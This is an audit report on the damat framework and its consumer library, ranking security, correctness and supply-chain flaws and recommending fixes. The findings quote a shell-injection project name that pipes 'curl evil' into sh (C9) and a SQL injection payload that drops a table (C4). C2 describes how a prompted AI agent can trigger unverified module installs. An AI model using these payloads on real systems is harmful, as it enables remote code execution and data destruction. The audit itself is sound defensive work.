# Damat Framework — Package Audit & Analysis

**Date:** 2026-07-02
**Scope:** `damat` framework monorepo (25 packages) and the `library` consumer monorepo (104 modules)
**Nature:** Read-only audit. No source was modified. Findings are evidence-based with `file:line` references; the highest-severity items were reproduced against real consumer code.

---

## 1. Executive summary

Damat is a genuinely well-architected, thoughtfully-documented framework with unusually disciplined structure (a ~100-line-per-file rule that the 104-module library obeys almost perfectly) and high *line* test coverage (100% thresholds in most packages). The layering — route → workflow → step → accessor → ORM — is real and consistently followed at scale.

The central finding is a **gap between what the API surface advertises and what the runtime actually guarantees.** The same three failure patterns recur across every cluster:

1. **Typed options silently ignored at runtime.** `skip`/`take`, `paths.migrations`, the workflow `idempotent` flag, `DeleteOptions.returning`, and `config.types` all type-check, appear in docs/READMEs, and do nothing. The most damaging: `findMany({ take, skip })` drops both keys and runs an unbounded `SELECT *`.
2. **Advertised durability/safety that isn't enforced.** The saga engine is in-memory only (no journal, no idempotency); soft-delete is written but never filtered on reads; auto-timestamps are `DATE` (day-granularity) and `updated_at` is never maintained; the auth middleware is a pass-through stub; the Redis queue and rate-limiter are non-atomic pipelines.
3. **Check-then-act races** in transactions, link creation, migration application, and the rate limiter.

Crucially, **100% coverage did not catch these** because the suites are mock-heavy — the Redis fake is single-threaded, and the real-DB integration suites are gated behind `DATABASE_URL` and skip silently. Coverage measures line execution, not concurrency or real-database behavior.

The library repo is the strongest evidence in this audit: 104 modules, near-zero escape hatches (0 `@ts-ignore`, 0 `TODO/FIXME`, 5 `as any`), yet **93 of them ship a hand-written `*Indexes.sql`** and **~1,200 route handlers repeat the same error-mapping block** — the boilerplate *is* the framework's missing-feature list.

### Severity snapshot

| # | Finding | Severity | Where |
|---|---|---|---|
| C1 | Auth middleware is a pass-through stub — `auth:`-marked routes are unprotected by default | **Critical (security)** | framework |
| C2 | MCP `add_module` bypasses verification for git/local sources → unauthenticated, script-executing RCE reachable by an AI | **Critical (security)** | mcp + damat-cli |
| C3 | `skip`/`take` are silent no-ops → unbounded full-table scans; no max page size anywhere | **Critical (availability)** | services + link |
| C4 | Untyped CRUD options reach `whereRaw`/`allowFullTable`; `orderBy.direction` interpolated unvalidated → SQL injection / mass-delete from JSON body | **Critical (security)** | services + orm-pg |
| C5 | Saga engine has no persistence and no idempotency; retries/crashes duplicate side effects | **Critical (correctness)** | workflow-engine |
| C6 | Auto-timestamps are `DATE` (day granularity); `updated_at` never maintained | **High** | orm-model |
| C7 | Soft-delete written but never filtered on reads → deleted rows resurface | **High** | orm-pg / services |
| C8 | Redis queue `dequeue` and rate-limiter are non-atomic pipelines → duplicate/lost jobs, limit overrun | **High** | redis |
| C9 | `create-damat-app` runs shell with interpolated project name; `git init/commit` runs in the user's cwd | **High** | create-damat-app |
| C10 | Cross-module link pivot-name drift → every link op in the reference app hits a nonexistent table | **High** | link |
| C11 | Published packages ship `"*"` internal deps + inert `.bunfig.toml` + no library CI | **High (supply chain)** | repo-wide |
| C12 | `migrate:status` always reports every migration pending (name-vs-path key mismatch) | **High** | orm-migration |

---

## 2. Critical & high-severity findings (detailed)

### C1 — Auth is a pass-through stub *(framework)*
`packages/framework/src/middleware/auth.ts:19,27-28`: unless the app supplies a custom handler, any non-`none` auth type logs `"Auth type … not implemented, passing through"` and calls `next()`. There are **zero `better-auth` imports** in the framework, and the reference app's entire auth layer is commented out (`backend/default/src/api/middleware/auth.ts`, and a `routea.ts` typo that keeps it out of route scanning). For a framework whose pitch is "batteries-included … Better Auth," a route annotated `auth: {...}` is silently unauthenticated. **Highest security ROI to fix.**

### C2 — MCP install path is an unverified, script-executing RCE *(mcp + damat-cli)*
The verification gate runs **only** for registry sources: `packages/cli/damat/src/command/module/add.ts` guards it behind `if (resolved.registry)`. The MCP `add_module` tool accepts git URLs and `owner/repo` shorthand directly (`packages/mcp/src/tools/add-module.ts:8-12,29`), and `resolveModuleSource` (`helpers/source.ts:80-104`) treats any such string as a trusted clone. The installed module's dependencies are then fed to `spawnSync("bun", ["add", ...specs])` (`helpers/packages.ts:14`) with **no name/range validation and lifecycle scripts enabled** — a malicious module's `postinstall` runs arbitrary code. Module id / `--name` is not sanitized against `../` (`add.ts:74`), giving path-traversal writes on top. Net: an AI prompted to `add_module <git-url>` is a full remote-code-execution primitive with no confirmation step. (Args are arrays, so there is no *shell* metacharacter injection — the risk is package lifecycle scripts + the missing gate.)

### C3 — `skip`/`take` silent no-op, no page cap *(services + link)*
`packages/service/src/service/methods.ts:139-141` forwards options to the repo, but the ORM reads only `limit`/`offset` (`packages/orm/pg/src/query/accessor/find.ts:15-16`) — unknown keys are dropped. `svc.user.findMany({ take: 10, skip: 20 })` therefore runs `SELECT * FROM "user"` with **no LIMIT**. The README documents the broken `take`/`skip` form (`service/README.md:69`). There is **no maximum page size anywhere**, and the bug propagates into `@damatjs/link` `fetch`/`graph` (`link/src/service.ts:132-148`) → unbounded reads on link hydration. The library confirms the downstream cost: **373 findMany steps hand-destructure `{ limit, offset, orderBy, orderDir }`** and **no list endpoint returns a total count** (0 usages across 104 modules).

### C4 — Untyped CRUD options → injection / mass-operations *(services + orm-pg)*
`findMany`/`delete` forward unrecognized option keys straight through (`methods.ts:141,262`), and the ORM honors `whereRaw` (raw SQL) and `allowFullTable`. A route doing `svc.user.findMany(req.body.query)` accepts `{"whereRaw":{"sql":"1=1); DROP TABLE users;--"}}` or `{"where":{},"allowFullTable":true}` (mass-delete). Separately, `orderBy.direction`/`nulls` are string-interpolated into SQL with only a compile-time union (`orm/pg/src/query/helpers/clauses.ts:8-10`), reachable from untrusted JSON via services *and* `link.graph({ orderBy })`. Also mass-assignment: `_validateData` (`methods.ts:498-528`) builds a zod schema over *all* columns and strips extras rather than rejecting them — there is no `readonly`/`fillable` concept, so `create({ data: { role: "admin" } })` succeeds if `role` is a column. Note isolation levels *do* get a runtime whitelist (`transaction/manager.ts:6-13`) — the same rigor was simply not applied to `orderBy` or option keys.

### C5 — Saga engine: no persistence, no idempotency *(workflow-engine)*
Workflow state lives only in in-memory `engineState` (`workflow/execute.ts:29-33`); nothing is journaled. A crash after a step commits but before the workflow ends leaves the row with **no compensation ever run**. Retries re-invoke the step wholesale (`step/execute.ts:132-136`) → duplicate charges/emails. The `idempotent` flag is **dead code** (declared `types/step.ts:12`, defaulted `config/constant.ts:10`, never read). Compounding risks: lock TTL defaults to 5 min with `autoExtend` off (`lock/constants.ts:2`, `types/lock.ts:33`) so a long run can be executed concurrently by a second runner with no fencing token; `parallel()` fail-fast can interrupt a step after its effect commits but before its compensation finalizer registers (`step/execute.ts:218,239`) → charge without refund; and a Redis outage at lock release discards an already-computed successful result (`workflow/create.ts:199`, no try/catch). The library's **992 generated workflows use zero `executeWithLock`** — all are duplicate-prone on client retry. The lock *primitives* themselves are correct (verified: `SET NX PX` + UUID token + Lua compare-and-delete/extend in `core/redis/src/lock/`). The docs are honest that persistence is absent — but the engine is best-effort in-memory, which should be stated far more loudly given it's the "saga with compensation" selling point.

### C6 — Auto-timestamps are `DATE` *(orm-model)*
`packages/orm/model/src/schema/model.ts` emits `created_at`/`updated_at`/`deleted_at` with `type: "date"` (verified lines ~182-207); confirmed in every consumer migration (e.g. `library/.../Migration…_Log.sql`: `"created_at" DATE`). Day granularity only — same-day rows can't be ordered by creation, and soft-delete/restore within a day is indistinguishable. `updated_at` is additionally **never maintained** (no trigger, no write-path set), so it stays NULL forever. The library votes with its feet: **207 model files declare their own `columns.timestamp()`**, and 326 `.timestamps()` + 296 `.softDelete()` explicit calls appear despite both defaulting to `true` — authors don't trust the defaults.

### C7 — Soft-delete is write-only *(orm-pg / services)*
`_softDelete = true` by default adds `deleted_at` and the service writes it on delete (`methods.ts:281-305`), but **no read path** (`select/builder.ts`, `repository.ts`, `findMany`/`findOne`/`count`, relation loads) ever adds `deleted_at IS NULL`. Soft-deleted rows come back from every query, and `repo.delete()` hard-deletes. The feature is effectively inert.

### C8 — Redis queue & rate-limiter are non-atomic *(redis)*
`queue/queue.ts:26-55`: `ZRANGEBYSCORE` (read) and `ZREM`/`ZADD :processing` (claim) are separate round-trips — two workers read the same job ids and both process (duplicate delivery, contradicting `docs/queue.md:74`'s "atomically move" claim). Jobs moved to `:processing` are never reclaimed (no visibility timeout / ack), so a crash strands them forever. `rateLimit/check.ts:16-27`: a pipeline (not `MULTI`/Lua) → N concurrent callers each read `zcard = max-1` and all pass; worse, `zadd` runs *unconditionally before* the allow decision and `pexpire` runs every call, so a flood of *rejected* requests keeps the window from ever draining. Both must be single Lua scripts. The library already works around the queue with an external lock (`shared/job-queue/.../claim.ts`) — direct evidence the primitive is unsafe alone. (Related: `counter/increment.ts:26-29` resets TTL on every increment despite a JSDoc promising "first only" → counters never expire; `cache/deletePattern.ts:13` uses blocking `KEYS`.)

### C9 — `create-damat-app` shell + wrong-directory git *(create-damat-app)*
`src/utils/commands/executor.ts:32-34,70-71` run interpolated strings with `shell: true`/`exec`. Project names passed as CLI args are **not slugified** (`projectCreatorFactory.ts:79-81`), so `create-damat-app 'x$(curl evil|sh)'` executes, and `--repo-url`/`--version` are similarly injectable; paths with spaces also break. Separately, `initializeFreshGit` (`cloneRepo.ts:116-155`) omits `cwd`, so `git init -b main && git add . && git commit` runs in the user's **current** directory — silently creating/committing a repo over their working tree while the scaffolded project gets no git history. The scaffolded app also can't boot: `.env` gets no `DATABASE_URL` (the 263-line Postgres-provisioning code in `utils/database/` is never imported), yet `startServices()` immediately runs `bun run dev` against a framework that requires it, and secrets are hardcoded `supersecret`.

### C10 — Cross-module link pivot drift *(link)*
`defineLink` derives FK targets and pivot names from the model *key*, not the table name (`defineLink.ts:61-63` → `pivot.ts:29`; `types.ts:10-12` states they differ), hard-codes `referencedColumns: ["id"]` (breaking the library's `primaryKey: "sku"` links), and sets no `onDelete`. In the reference app, `links/user/models/user-organization.ts:10-13` uses `model: "users"/"organizations"`, so `defineLink` computes pivot `user_users_organization_organizations` with `users_id`/`organizations_id`, but the checked-in migration created `user_organization` with `user_id`/`organization_id` — **every create/dismiss/fetch/graph on this link hits a nonexistent table at runtime.** There is also no orphan cleanup (nothing dismisses junction rows on entity delete), the "idempotent" `create` is a check-then-insert race, and `graph({module,entity})` resolves *any* registered accessor (unscoped data exposure). In practice the library barely uses the API: `defineLink` appears only as 112 dormant template files across 26 modules, `include` eager-load is used **0 times**, and every real join is done by hand via plain id columns.

### C11 — Publishing & supply-chain integrity *(repo-wide)*
- **`"*"` internal versions.** Every internal dep is `"@damatjs/x": "*"`; neither bun nor changesets rewrites this on publish, so a published `@damatjs/framework@0.5.0` will pull *the latest* `@damatjs/services` at install time — the lockstep versioning the docs promise is unenforced. Use `workspace:*` (rewritten on pack) or exact versions.
- **Inert `.bunfig.toml`.** Verified: `bunfig.toml` (the filename bun loads) contains only `optional = true`; the protections — `minimumReleaseAge = 172800`, `enableScripts = false` — live in `.bunfig.toml`, which bun does not load by default. The framework repo's supply-chain guards are likely **not in effect.**
- **No library CI at all** (no `.github/` in the library repo) for 104 modules / 66k test lines; damat's `release.yml` publishes on tag **without running tests** and without `--provenance` despite `id-token: write`; CI installs non-`--frozen-lockfile` (forced by a gitignored `modules/*` workspace glob), so the lockfile is never validated where it matters.
- **10 packages ship no `license` field** and the root `LICENSE` isn't in any `files` whitelist, so most tarballs ship unlicensed; `repository.directory` is wrong for `logger` and `orm` (both point at `packages/core/types`); `create-damat-app` has no `files` whitelist (publishes tests + `docs/`); only 3 of 24 packages have a `prepublishOnly` dist guard.
- **`@damatjs/mcp` ships raw TypeScript** (`bin: ./bin/damat-mcp.ts`, `build: "exit 0"`) — unusable via `npx`/node outside bun.

### C12 — `migrate:status` always says "pending" *(orm-migration)*
`migrate:up` records applied migrations by module **name** (`executor/run.ts:55,75`) but `migrate:status` filters the tracker by the module's absolute **path** (`cli/.../migrate/status.ts:63-65`, `executor/status.ts:26,62`), so `WHERE module = '/app/src/modules/user'` never matches `'user'` and everything reads as pending. (Related migration hazards: no `pg_advisory_lock` around DDL → concurrent-deploy races; generated `ALTER TYPE … ADD VALUE` inside the file's `BEGIN…COMMIT` cannot be used in the same transaction; a `ROLLBACK` that throws masks the original error; a column rename diffs to `DROP` + `ADD` with no data-loss warning; and a type change drops the new length — `integer → varchar(50)` emits unbounded `VARYING`.)

---

## 3. Design & API gaps

- **No dependency injection — everything is a `globalThis` singleton** (logger, `PoolManager`, module registry, link resolver). Two independent apps/pools in one process are impossible; test isolation depends on manual `reset()` discipline, and `stop()` never clears the module registry, leaking state across sequential apps.
- **No lifecycle hooks or event system.** `ModuleService` has no before/after-CRUD hooks and emits no events (`config.types` is accepted and ignored); `BootableModule` has only `init()`, no `dispose`/`onStop`. This is the structural cause of the consumer boilerplate below.
- **No request validation at the framework edge for auto-CRUD, and no OpenAPI generation** — the metadata (route validators + model schemas) already exists to generate one.
- **Two half-integrated relation systems.** `orm-pg` has an efficient lateral-join eager loader (tested), but the service layer that consumers actually use implements `include` as a per-row loop — a textbook **N+1** (`methods.ts:149-154`). The lateral path also guesses the FK as `${table}_id` when `mappedBy` is missing.
- **Missing table-stakes ORM features:** no down-migrations/rollback (the building blocks `reverseDiff` + `recordReverted` exist but are dead code), no dry-run, no seeding, no cursor pagination, no `groupBy`/aggregates (`sum`/`avg`), no `OR`/nested boolean `where` (implicit AND only), no optimistic locking, no prepared statements, and `RETURNING *` is unavoidable.
- **Inconsistent error taxonomy.** Plain `throw new Error`, `ZodError`, and typed `AppError` coexist with no unified service-level errors, so consumers hand-roll HTTP mapping by string-matching — **313 `msg.includes("not found") ? 404 : 400`** occurrences across 78 modules. Raw errors also leak schema (column/table names) if they reach a client.
- **Redis is missing pub/sub and Streams** — Streams with consumer groups would be the correct substrate for the queue's missing ack/reclaim semantics.
- **Logger has no trace context (OpenTelemetry), no metrics, and no secret redaction** — context is `JSON.stringify`'d verbatim, so any secret in context or a thrown error is logged in full.

---

## 4. What the library tells us to build (consumer-driven features)

The 104-module library is remarkably clean (0 `@ts-ignore`, 0 `TODO/FIXME`, 5 `as any`, 0 file-size-rule violations in hand-written code), which makes its *repetition* a precise specification of missing framework features:

| Observed pattern (quantified) | Count | Framework feature it implies |
|---|---|---|
| Hand-written `*Indexes.sql` migrations | **93 / 104 modules** | Historic `migration:create` gap (current generator emits indexes — this is now a **docs/tooling desync**, and 11 modules that skipped it, incl. `finance/invoice`, have **declared-but-never-created indexes** in prod) |
| Identical error-envelope / 404 blocks in generated `api.ts` | **~1,200 handlers, ~2,324 lines** | Typed domain errors + a `workflowToResponse()` helper / CRUD-route generator honoring the existing `AppError` taxonomy |
| `msg.includes("not found") ? 404 : 400` | **313 in 78 modules** | Typed `NotFoundError` etc. with HTTP-status mapping |
| `getModule("x"); if (!svc) throw` guards | **2,504** | Step context should carry a typed module handle |
| Pagination destructure glue in findMany steps | **373 steps** | First-class list-query translation + a paginated envelope with total count (0 exist today) |
| JS-side aggregation after `findMany` (`.reduce`) | **88 in 33 lib files** | ORM `sum`/`avg`/`groupBy` (this is a finance-heavy library computing balances by fetch-all-then-reduce) |
| Append-only `*_events` audit models | **59 model files** | An audit/event-log mixin (`shared/log` exists *because* this is missing) |
| Gap-free numbering gateways | **25 files, 19 modules** | A sequence / number-series primitive |
| Integer minor-unit money helpers | **27 files, 40 modules** | A `Money`/minor-units type in `@damatjs/deps` |
| Status state machines (`TRANSITIONS`/`assertFrom`) | **17 modules** | A transition-guard primitive |
| `"Scaffolded once by damat codegen"` committed files | **5,220** | Consider runtime CRUD generation vs materializing per-table files (a template fix today = regen loop × 104) |
| `registerModule()` after `bootModule()` in tests | **103 / 104** | The test harness should populate the registry the real backend does |
| `describe.skipIf(!DATABASE_URL)` gates | **284 files** | Harness-owned ephemeral-DB isolation (today DB suites **silently skip-pass** without a live Postgres — the library's documented #1 historical defect source) |

`shared/` is effectively a framework staging area: `job-queue` (durable jobs, built on `initRedis` imported *from the framework*), `notification` (channel-adapter registry + retry/dedupe), `file-management` (pluggable storage), `analytics`, `phi-redaction`, and `log` are generic infrastructure, not domain features — each is a candidate to graduate into the framework, and the repeated stub-provider-registry pattern implies a first-class provider/adapter contract.

---

## 5. Cross-cutting engineering health

- **Dependency graph:** 25 packages, no circular dependencies (verified programmatically over prod/dev/peer edges). Discipline is real — **zero direct imports of `effect`/`hono`/`pg`/`zod` outside `@damatjs/deps`**. Weaknesses: `orm-pg` dev-depends on the higher-level `orm-processor` (inverted layering that turbo turns into a build-order edge), `framework` declares an unused `@hono/node-server` dep, TypeScript versions are three-way skewed (`5.9.2` / `^5.9.3` / `^5.0.0`), and `tsc-alias` is duplicated across 9 packages.
- **Versioning:** everything is `0.5.0` except `codegen` (`2.0.3`, an independent line published to npm at 1.0.0 that can't be renumbered into the lockstep) and `typescript-config` (`0.0.0`). CLI `--version` strings are hardcoded and stale (`damat` reports `0.3.1`, `create-damat-app` `0.0.1`). `releases/README.md` still says "Current version: 0.3.0" and no `0.5.0` release note exists anywhere; `.changeset/` has zero pending changesets, so versioning is manual and the changelog machinery is bypassed.
- **Tests:** damat has 255 test files / ~44k lines; library has 496 / ~67k, every module covered. But coverage is **mock-heavy and thresholds mislead** — the Redis fake is single-threaded (the race bugs are structurally untestable), and real-DB suites skip silently. `turbo.json` caches the `test` task in damat keyed on env-var *values* but not DB *state*, so a cached pass can mask a regression.
- **Docs:** the two-tier standard (README + `docs/` + `releases/<pkg>/`) is structurally 100% followed, and package READMEs spot-check clean against exports. Drift is concentrated in `releases/` and in the `AUTHORING-GUIDE` still instructing hand-authored indexes.
- **Committed `.env.test` files** (~104 in the library, one in orm-connector) carry dummy `postgres:Password@…` creds; `.gitignore` only excludes `.env.test.local`, so the pattern will eventually leak a real credential.
- **Library repo hygiene:** the root `README.md`, `apps/web`, `apps/docs`, and `packages/{ui,eslint-config,typescript-config}` are untouched `create-turbo` starter stubs; `engines: { node: ">=18" }` contradicts the bun-only stack; every `@damatjs/*` dep is pinned to `"latest"` (non-reproducible).

---

## 6. Prioritized recommendations

**P0 — Security & data-loss (do first)**
1. Implement real auth wiring (Better Auth) behind the `auth` config type, or make an unhandled auth type **fail closed** instead of `next()`. *(C1)*
2. Lock down the MCP install path: require verification for git/local sources, allow-list package names, default `bun add --ignore-scripts`, sanitize `name`/`dir` against traversal, and add a confirm/dry-run step. *(C2)*
3. Cap pagination (default + max `take`) and make `skip`/`take` actually map to `limit`/`offset`; reject unknown option keys and `whereRaw`/`allowFullTable` at the service boundary unless explicitly opted in; whitelist `orderBy.direction`/`nulls`. *(C3, C4)*
4. Fix the two `create-damat-app` data-affecting bugs: `cwd` on `initializeFreshGit`, and switch `executor` to argv arrays (drop `shell: true`). *(C9)*
5. Move the Redis queue `dequeue` and rate-limiter to atomic Lua scripts; add a visibility-timeout reclaimer + ack/nack. *(C8)*

**P1 — Correctness the API implies**
6. Change auto-timestamps to `timestamptz` and maintain `updated_at`; make soft-delete filter reads (`deleted_at IS NULL`) with a `withDeleted()` escape hatch. *(C6, C7)*
7. Give the saga engine a durable step journal + implement the `idempotent` flag; add fencing tokens and default `autoExtend` on when a `lockId` is supplied; wrap lock-release in try/catch. Until shipped, document "best-effort in-memory" prominently. *(C5)*
8. Fix `migrate:status` (key on name consistently), add `migrate:down` (building blocks exist), advisory locking, and rename detection / data-loss warnings. *(C12)*
9. Resolve real table names + honor `primaryKey` in link FK generation; add pivot-drift detection at boot, `dismissAllFor(entity)`, and scoping on `graph`. Fix the reference-app link. *(C10)*
10. Consolidate `.bunfig.toml` into `bunfig.toml`; replace `"*"` internal deps with `workspace:*`; add a test gate before `release.yml` publish + `--provenance`; add CI to the library repo. *(C11)*

**P2 — DX & de-boilerplate (the library's shopping list)**
11. Ship a typed domain-error taxonomy + a CRUD-route/response bridge — deletes ~2,300 lines of repeated handler code across consumers.
12. Wire the lateral-join eager loader into the service layer to kill the `include` N+1; add ORM aggregates (`sum`/`groupBy`) and cursor pagination.
13. Move `registerModule` + ephemeral-DB isolation into the test harness (fixes the silent skip-pass and enables parallel tests).
14. Graduate `job-queue`, notification adapters, and sequence/money/state-machine/audit-log primitives from `shared/` into the framework; formalize a provider/adapter contract.
15. Add the missing CLI commands (`damat module remove`, transactional install with rollback, `damat doctor`); prune `create-damat-app`'s unused deps (`open`, `wait-on`, `configstore`, `winston`) and replace the Medusa-fork "facts."

**P3 — Hygiene**
16. Add `license`/`repository` to all packages, fix the two wrong `repository.directory` values, add `files`/`prepublishOnly` guards where missing, fix `@damatjs/mcp` distribution, single-source the CLI version strings, update `releases/`, and clean the library's starter stubs + `engines`.

---

*Full per-cluster findings with every `file:line` reference are preserved in the working notes under `scratchpad/audit/` (ORM, framework, core/MCP, CLIs, library usage, cross-cutting).*
